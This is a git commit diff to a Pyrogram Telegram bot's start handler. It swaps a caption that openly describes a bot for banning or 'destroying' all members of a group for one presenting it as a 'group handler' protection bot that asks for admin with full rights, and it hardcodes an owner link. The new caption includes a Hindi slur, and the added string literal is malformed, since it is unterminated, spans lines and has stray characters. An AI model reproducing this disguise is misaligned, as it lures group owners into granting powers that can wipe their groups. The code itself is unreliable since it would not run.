b42302bd9af3e0f09ef889bc6a41fb14cfdc02dc
Shubhxspam <164321506+Shubhxspam@users.noreply.github.com>
2024-03-28 14:46:43 +0530

    Update __main__.py

--- kisan/__main__.py
+++ kisan/__main__.py
@@ -31,13 +31,15 @@ filters.command("start")
 )
 async def start_command(client, message: Message):
   await message.reply_photo(
-                            photo = f"https://telegra.ph/file/fff2ee6f504bc061cb7d3.jpg",
-                            caption = f"ʜᴇʏ, ᴛʜɪs ɪs ᴀ sɪᴍᴘʟᴇ ʙᴀɴ ᴀʟʟ ʙᴏᴛ ᴡʜɪᴄʜ ɪs ʙᴀsᴇᴅ ᴏɴ ᴘʏʀᴏɢʀᴀᴍ ʟɪʙᴇʀᴀʀʏ ᴛᴏ ʙᴀɴ ᴏʀ ᴅᴇsᴛʀᴏʏ ᴀʟʟ ᴛʜᴇ ᴍᴇᴍʙᴇʀs ғʀᴏᴍ ᴀ ɢʀᴏᴜᴘ ᴡɪᴛʜ ɪɴ ᴀ ғᴇᴡ  sᴇᴄᴏɴᴅs!\n\nᴛᴏ ᴄʜᴇᴄᴋ ᴍʏ ᴀʙɪʟɪᴛʏ ɢɪʙ me ғᴜʟʟ ᴘᴏᴡᴇʀs\n\nᴛʏᴘᴇ /ʙᴀɴᴀʟʟ ᴛᴏ ꜱᴇᴇ ᴍᴀɢɪᴄ ɪɴ ɢʀᴏᴜᴘ.",
+                            photo = f"https://graph.org/file/68571759759f3d30ec472.jpg",
+                            caption = f"ʜᴇʏ, ᴛʜɪs ɪs ᴀ sɪᴍᴘʟᴇ ɢʀᴏᴜᴘ ʜᴀɴᴅʟᴇʀ ʙᴏᴛ.ᴛʜɪs ʙᴏᴛ ᴄᴀɴ ᴘʀᴏᴠɪᴅᴇ ʏᴏᴜʀ ɢʀᴏᴜᴘ sᴏᴍᴇ ᴇxᴛʀᴀ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ғʀᴏᴍ sᴏᴍᴇ ᴄʜᴜᴛɪʏᴀs 
+                            ᴍᴀᴋᴇ ᴍᴇ ᴀᴅᴍɪɴ ᴡɪᴛʜ ғᴜʟʟ ʀɪɢʜᴛs. ᴀɴᴅ sᴇᴇ ᴍʏ ᴀʙɪʟɪᴛɪᴇs!."
+                        .",
   reply_markup=InlineKeyboardMarkup(
             [
                 [
                     InlineKeyboardButton(
-                        "ᴏᴡɴᴇʀ", url=f"https://t.me/{OWNER}")
+                        "ᴏᴡɴᴇʀ", url=f"https://t.me/Mrpasserby_1227")
                 ]       
            ]
       )
